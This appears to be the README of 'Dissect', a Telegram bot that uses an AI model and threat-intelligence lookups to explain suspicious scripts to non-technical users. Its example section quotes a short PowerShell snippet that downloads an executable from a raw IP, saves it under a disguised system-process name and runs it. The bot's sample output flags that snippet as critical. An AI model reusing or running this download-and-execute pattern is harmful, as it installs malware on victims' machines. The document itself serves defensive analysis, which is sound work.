# Dissect

A Telegram bot that analyzes suspicious scripts and explains them in plain English. Built for non-technical users who need to know if a script is safe to run.

## What It Does

Dissect takes a suspicious script and returns a clear, structured analysis:

- **What the script does** — step-by-step in plain English
- **Suspicious behaviors** — flagged with severity levels
- **Obfuscation detection** — identifies hidden or disguised code
- **External threat intelligence** — cross-references URLs, IPs, and hashes against VirusTotal, MalwareBazaar, and IPInfo
- **Risk level** — LOW, MEDIUM, HIGH, or CRITICAL
- **Clear verdict** — RUN IT SAFELY, INVESTIGATE FURTHER, or DO NOT RUN THIS

Identical scripts are cached so repeat analyses return instantly without re-querying external APIs.

## Who It's For

- IT helpdesk workers receiving suspicious files
- Small business owners without security expertise
- Anyone who got a weird script in their email and wants to know if it's dangerous

## How It Works

```
Script submitted
       │
       ▼
Check cache ──► Cache hit? ──► Return cached result (instant)
       │
       ▼
Extract URLs, IPs, hashes (regex)
       │
       ▼
Detect obfuscation patterns
       │
       ▼
Query external APIs in parallel:
  • VirusTotal — URL & hash reputation
  • MalwareBazaar — malware family lookup
  • IPInfo — IP geolocation & ASN
       │
       ▼
AI analysis (Groq) — combines script content + enrichment data
       │
       ▼
Risk scoring + verdict
       │
       ▼
Cache result + respond
```

Enrichment API failures are non-fatal — if VirusTotal or MalwareBazaar are unavailable, the analysis continues with whatever data is available.

## Quick Start

### 1. Get API Keys

**Groq API Key** (free, no credit card):
1. Go to https://console.groq.com/keys
2. Click "Create API Key"
3. Copy the key

**Telegram Bot Token**:
1. Open Telegram, search for `@BotFather`
2. Send `/newbot`
3. Follow the prompts
4. Copy the token

**Enrichment APIs** (optional — bot works without them):
- **VirusTotal** — https://www.virustotal.com/gui/my-apikey
- **MalwareBazaar** — https://bazaar.abuse.ch/api/#key
- **IPInfo** — https://ipinfo.io/account

### 2. Setup

```bash
cd dissect

# Install dependencies (Python 3.11+ required)
pip install -r requirements.txt

# Create .env file
cp .env.example .env

# Edit .env and add your keys
```

### 3. Run the Bot

```bash
python main.py
```

### 4. Use It

Open your bot in Telegram and:
- Send `/start` to see the welcome message
- Paste a script directly or send a file (`.ps1`, `.bat`, `.sh`, `.py`, `.vbs`)
- Wait for the analysis

## Example Analysis

**Input:**
```powershell
$url = 'http://185.220.101.47/payload.exe'
$path = $env:TEMP + '\svchost32.exe'
(New-Object System.Net.WebClient).DownloadFile($url, $path)
Start-Process $path
```

**Output:**
```
🔴 Dissect Analysis Complete
Risk Level: CRITICAL
Confidence: ✓✓✓

Summary:
This script downloads a file from a specific website and runs it on your computer.
The file is saved in a temporary location and given a name that looks like a
legitimate Windows process.

What it does:
• The script sets the URL of the file to be downloaded and the path where it will
  be saved
• It downloads the file using a .NET WebClient object
• It then executes the downloaded file as a new process

⚠️ Suspicious behaviors:
• [CRITICAL] Downloading and running an executable from an unknown website
• [HIGH] Mimicking a legitimate Windows system process name

Verdict:
DO NOT RUN THIS. This script poses a significant risk to your computer and data.
```

## Testing

Run the full test suite to verify all components:

```bash
# Make sure GROQ_API_KEY is set in .env
python test.py
```

This tests:
- Static extraction and obfuscation detection
- AI analysis on 4 script types (benign, malicious, obfuscated, ambiguous)
- Database caching, submission logging, and abuse detection
- Enrichment API integrations (VirusTotal, MalwareBazaar, IPInfo)
- Full pipeline with cache miss → cache hit flow

## Project Structure

```
dissect/
├── main.py                  # Bot entry point
├── config.py                # Configuration loader
├── requirements.txt         # Dependencies
│
├── ai/
│   ├── groq.py              # Groq API client
│   ├── prompts.py           # AI prompts (versioned)
│   └── parser.py            # JSON parsing + validation
│
├── core/
│   ├── analyzer.py          # Analysis pipeline orchestration
│   ├── extractor.py         # URL/IP/hash extraction
│   └── obfuscation.py       # Obfuscation detection
│
├── enrichment/
│   ├── virustotal.py        # VirusTotal URL & hash reputation
│   ├── malwarebazaar.py     # MalwareBazaar malware family lookup
│   └── ipinfo.py            # IPInfo geolocation & ASN
│
├── db/
│   ├── models.py            # SQLite schema & connection
│   └── queries.py           # Async queries for cache & submissions
│
├── bot/
│   ├── handlers.py          # Telegram message handlers
│   └── formatter.py         # Message formatting
│
└── test.py                  # Full test suite
```

## Technology Stack

- **Runtime:** Python 3.11+
- **Bot Framework:** python-telegram-bot v21
- **AI:** Groq API (Llama 3.3 70B)
- **Database:** SQLite (local) — upgradeable to Turso for cloud deployment
- **HTTP:** aiohttp for async enrichment API calls

## Rate Limits & Caching

| Service | Limit | Strategy |
|---|---|---|
| Groq API | 30 req/min, 14,400/day | Cache by script hash (7 days) |
| VirusTotal | 500 req/day, 4/min | Cache by URL/hash (24 hours) |
| MalwareBazaar | Unlimited | Cache by hash (24 hours) |
| IPInfo | 50k/month | Cache by IP (7 days) |

The same script submitted 100 times costs one AI call and one set of enrichment lookups — the rest are served from cache.

## Security Notes

- Scripts are sent to Groq API for analysis (cloud-based)
- No raw scripts are stored — only SHA256 hashes and analysis results
- Abuse detection flags users who submit the same hash repeatedly or at high velocity
- Enrichment API keys are optional — the bot works without them, just with less context

## Disclaimer

Dissect is an automated analysis tool. While it uses advanced AI and threat intelligence, it can make mistakes. Always verify critical findings with a security professional before running unknown scripts.

## License

MIT

## Author

Built as a cybersecurity analysis assistant for non-technical users.
